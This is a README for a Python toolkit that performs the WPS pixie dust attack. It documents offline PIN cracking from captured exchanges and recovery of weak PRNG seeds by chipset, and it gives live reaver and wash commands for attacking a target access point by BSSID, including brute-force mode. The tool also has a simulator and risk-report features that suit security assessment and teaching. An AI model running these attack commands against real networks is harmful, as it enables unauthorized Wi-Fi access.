# WiFi WPS Attack Tool

**Wi-Fi Protected Setup (WPS) security analysis & attack toolkit** — a
pure-Python, offline-first implementation of the *pixie dust* attack,
with a synthetic vulnerable-AP simulator, `wash` scanning, `reaver`
live-attack orchestration, and risk-report generation.

## What this tool does

WPS PIN authentication is structurally weak. In the classic *pixie
dust* attack (discovered by Dominique Bongard, 2014) the AP-side
"secret" nonces `E-S1`/`E-S2` that protect the PIN hashes turn out to be
generated by **broken PRNGs** seeded with the AP's uptime. Once you know
one WPS exchange (PKE, PKR, E-Hash1/2, E-Nonce, AuthKey — all printed by
`reaver -K -vv` or recoverable from a passive capture), the 8-digit PIN
is an **offline** computation: two independent HMAC-SHA256 searches of
10⁴ and 10³+10⁴ candidates each — seconds to minutes, no further
interaction with the AP.

This repository implements, in Python 3 (standard library only):

| Capability | Module | Notes |
|---|---|---|
| Offline PIN solver (all known weak-PRNG modes) | `wps_attack/pixiedust.py` | line-by-line port of the `pixiewps` algorithm |
| Weak PRNG ports (Ralink LFSR, glibc `srand`/`rand`, eCos LCGs) | `wps_attack/prngs.py` | the glibc model is cross-verified against the real libc |
| Full WPS protocol math (PIN checksum, PSK, E-Hash, KDF, AES-CBC EncrSettings) | `wps_attack/wps.py`, `crypto.py` | AES-128 verified against the FIPS-197 test vector |
| Synthetic vulnerable-AP simulator | `wps_attack/simulator.py` | generates realistic captures — no hardware needed |
| WPS AP discovery | `wps_attack/scanner.py` | shells out to `wash`, or parses saved `wash` output |
| Live attack orchestration | `wps_attack/reaver_ctl.py` | drives `reaver`, parses its output, captures pxD values, offline fallback |
| Risk assessment engine | `wps_attack/analyzer.py` | transparent weighted findings + remediations + brute-force ETA |
| Markdown / JSON reports | `wps_attack/report.py` | report-per-AP with severity, evidence, fixes |
| Built-in self-test (no pytest needed) | `wps_attack/selftest.py` | crypto vectors, PRNG invariants, sim→crack round-trips |

## Supported PRNG modes

| Mode | Chipset family | How the seed is recovered | Typical cost |
|---|---|---|---|
| `rt` (1) | Ralink / MediaTek | LFSR state rebuilt from the E-Nonce, stepped backwards | instant |
| `rtl819x` (3) | Realtek RTL819x (glibc `srand(uptime)`/`rand`) | E-Nonce = 4 glibc `rand()` words → exact seed match; E-S1 = `rand` at `seed±d` (d ≤ 600), E-S2 at `s1+j` (j ≤ 10) | seconds (±1 day seed window) |
| `ecos-simple` (2) | Broadcom (eCos LCG, 23-bit) | E-Nonce[0] leaks the top 7 seed bits; scan the remaining 2²⁵ | ~10–30 s single core |
| `ecos-simplest` (4) | Broadcom (eCos LCG, 32-bit) | full 32-bit seed scan (capped, `--ecos-limit`) | minutes (explicit mode only) |
| `ecos-knuth` (5) | Broadcom (Knuth minstd) | full 32-bit seed scan (capped) | minutes (explicit mode only) |
| `zero` / `nonce-clone` | misconfigured firmware | E-S1 = E-S2 = 0, or E-S1 = E-S2 = E-Nonce | instant (auto pre-pass) |

The **auto** mode follows the exact detection order of `pixiewps`:
special cases first, then `rt`, then `rtl819x` (when the nonce's four
31-bit words have clear high bits), then `ecos-simple`. The two full-scan
modes are only tried when selected explicitly, matching upstream.

## Requirements

* **Python ≥ 3.8** — the core (solver, simulator, analyzer, reports,
  self-test) is 100% standard library.
* *Optional:* `pip install cryptography` — faster AES for
  Encrypted-Settings decryption (a pure-Python AES is built in and
  verified against the FIPS-197 vector).
* For **live** features on Linux:
  * `aircrack-ng` (provides `wash` for scanning),
  * `reaver` (t6x fork, provides the raw-802.11 WPS state machine),
  * a monitor-mode interface (`mon0`), run as **root**.

### Verify your install

```bash
wps-attack selftest
```

Runs 15 checks in ~45 s: AES-197 vector + CBC, WPS key-derivation chain,
PIN-checksum math over all 10⁷ valid PINs, PRNG inverse properties
(including a live cross-check of the glibc model against the system
`libc`), and a **simulator → offline-solver round-trip for every weak
PRNG mode**. All green = the engine is trustworthy.

## Quick start (offline, no WiFi hardware)

```bash
# 1. simulate a vulnerable Realtek AP (seed = current time)
wps-attack simulate --pin 12345670 --mode rtl819x --out cap.json

# 2. crack the capture offline
wps-attack pixie cap.json
#   [+] WPS PIN: 12345670
#       mode  = rtl819x   time = 1.0s

# 3. do it all in one shot
wps-attack simulate --pin 12345670 --mode rt --solve
```

### Offline solve from real capture values

Hex flags accept `:`, `-`, ` ` or no separator (same as `pixiewps`):

```bash
wps-attack pixie \
  --pke     d0141b... \
  --pkr     00...02 \
  --e-hash1 4a7f... \
  --e-hash2 91c2... \
  --e-nonce 7e0a... \
  --authkey 11ec... \
  --dh-small
```

* `--authkey` — AuthKey printed by `reaver -vv` (or from a passive
  capture). When omitted it is derived automatically:
  * `--dh-small` — attacker used DH private key 1, so
    `DHKey = SHA-256(PKE)` (no PKR needed);
  * RTL819x fixed-key PKE — `DHKey = SHA-256(PKR^priv mod p5)` with the
    published Realtek private key (needs `--r-nonce --bssid`).
* `--mode rtl819x --rtl-start <unix> --rtl-end <unix>` — widen/narrow
  the glibc seed window (default: now ± 1 day). `--rtl-full` scans all
  2³² (slow; use `--jobs N` to parallelize across processes).
* `--ecos-limit N` — cap the `ecos-simplest`/`ecos-knuth` scans
  (default 2²⁴; the C tool can scan all 2³²).
* `--out result.json` — persist the full result (PIN, PSK1/2, seeds,
  capture) for later reporting.

## Live workflow (hardware required)

```bash
# 0. monitor mode (example, Linux)
sudo ip link set wlan0 down
sudo airmon-ng stop wlan0
sudo airmon-ng start wlan0 0        # -> mon0

# 1. find WPS APs
wps-attack scan -i mon0
wps-attack scan --wash-file wash-out.txt --out-report

# 2. attack a target (pixie dust via reaver -K -S -vv)
wps-attack attack -i mon0 -b AA:BB:CC:DD:EE:FF --out-report

# 3. or parse saved reaver output values:
#    (reaver prints "executing pixiewps -e ... -r ... -s ... -z ...")
wps-attack pixie --pke ... --pkr ... --e-hash1 ... --e-hash2 ... \
                 --e-nonce ... --authkey ... --dh-small

# 4. known-PIN / brute-force modes
wps-attack attack -i mon0 -b AA:BB:CC:DD:EE:FF --mode pin --pin 12345670
wps-attack attack -i mon0 -b AA:BB:CC:DD:EE:FF --mode bruteforce -g 5000
```

`attack` streams and parses reaver's `-vv` output (rekey, WPS version,
lockout, progress, PIN, PSK), records the `executing pixiewps …` line so
the captured exchange can be re-analyzed offline, and with
`--offline-fallback` retries a failed reaver-internal pixiewps with the
built-in solver (e.g. when `pixiewps` is not installed).

### Session files

Reaver's `-s` session files are supported: pass `--session reaver-AA.json`
to resume/reuse a reaver session between runs.

## Risk analysis & reports

```bash
# assess from a saved wash file (no attack)
wps-attack analyze --wash-file samples/wash-sample.txt

# include attack evidence
wps-attack analyze --wash-file w.txt -b 00:11:22:33:44:55 \
    --pin 12345670 --pixie-success --rekey no
```

Writes `reports/wps-report.md` + `.json`. The scoring model is
transparent (see `analyzer.py`): WPS-enabled +15, no lockout +20,
pixie-dust-vulnerable +35, known/advertised PIN +40, factory default
+25, mitigations negative (rekey −15, lockout −5). Ratings:
≥80 CRITICAL, ≥55 HIGH, ≥30 MEDIUM, >0 LOW, else NONE. Reports also
include an online brute-force ETA (10⁷ valid PINs including lockout
penalties) and per-finding remediation text.

## Troubleshooting

| Symptom | Likely cause / fix |
|---|---|
| `pixie`: "no glibc seed in range" but AP looks vulnerable | widen `--rtl-start/--rtl-end` (AP booted >1 day ago, or clock skew), or `--rtl-full --jobs 4` |
| RT mode says "nonce not from Ralink LFSR" | AP firmware doesn't use the Ralink LFSR; try other modes |
| `attack` fails with raw-802.11 errors | monitor mode not set, not root, or driver lacks raw injection |
| `wash` not found | `apt install aircrack-ng` (or parse a saved file with `--wash-file`) |
| Self-test slow on small devices | the eCos-simple 2²⁵ scan is CPU-bound; expected ~10–30 s |
| `ec_limit` reached without a match for mode 4/5 | these are full 32-bit scans — raise `--ecos-limit` (up to 2³²) |
